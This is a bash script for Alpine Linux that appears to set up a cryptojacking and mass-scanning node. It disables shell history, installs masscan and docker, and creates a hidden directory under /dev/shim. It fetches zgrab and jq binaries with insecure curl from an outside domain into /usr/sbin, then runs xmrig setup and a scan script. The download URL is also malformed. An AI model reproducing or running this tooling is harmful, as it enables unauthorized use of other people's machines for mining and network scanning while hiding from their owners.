#!/bin/bash

unset HISTFILE
export LC_ALL=C
export PATH="$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games"
export SCAN_RATE=500000



# Log function
log() {
    local message="$1"
    echo "$(date) - $message" >> /var/log/upspin.log
}

# Main initialization function
function INIT_MAIN() {
    SETUP_BASICS
    SETUP_SYSTEM
    SETUP_TOOLS
    SETUP_MSCAN
    SETUP_XMR
    bash /root/scan.sh
}

# Install basic packages
SETUP_BASICS() {
    log "Starting SETUP_BASICS"
    apk update
    apk add --no-cache \
        go git sudo jq openrc masscan libpcap libpcap-dev docker make cmake upx \
        libstdc++ gcc g++ libuv-dev iptables openssl openssl-dev hwloc-dev gmp-dev \
        gengetopt flex byacc json-c-dev libunistring-dev judy-dev bash build-base \
        7zip screen curl wget vim
    log "Finished SETUP_BASICS"
}

# Update system and install additional packages
SETUP_SYSTEM() {
    log "Starting SETUP_SYSTEM"
    apk update || { log "APK update failed"; exit 1; }
    apk add --no-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing hwloc-dev || { log "Failed to install hwloc-dev"; exit 1; }
    log "Finished SETUP_SYSTEM"
}

# Ensure tools are installed and set up
SETUP_TOOLS() {
    log "Starting SETUP_TOOLS"
    mkdir -p /dev/shim/.../...nmlm...

    for file in zgrab jq; do
        if ! [ -x "/usr/sbin/$file" ]; then
            curl -sLk -o /usr/sbin/$file "https://http://emspaarcontrol.com/bin/$file" || { log "Failed to download $file"; exit 1; }
            chmod +x /usr/sbin/$file
            log "Installed $file"
        fi
    done
    log "Finished SETUP_TOOLS"
}

# Install masscan if not available
SETUP_MSCAN() {
    log "Starting SETUP_MSCAN"
    apk update
    apk add git gcc make musl-dev libpcap-dev linux-headers masscan || { log "Failed to install masscan"; exit 1; }
    log "Finished SETUP_MSCAN"
}

# Set up xmrig
SETUP_XMR() {
    log "Starting SETUP_XMR"
    bash /root/setup_xmrig.sh || { log "Failed to set up xmrig"; exit 1; }
    log "Finished SETUP_XMR"
}


INIT_MAIN
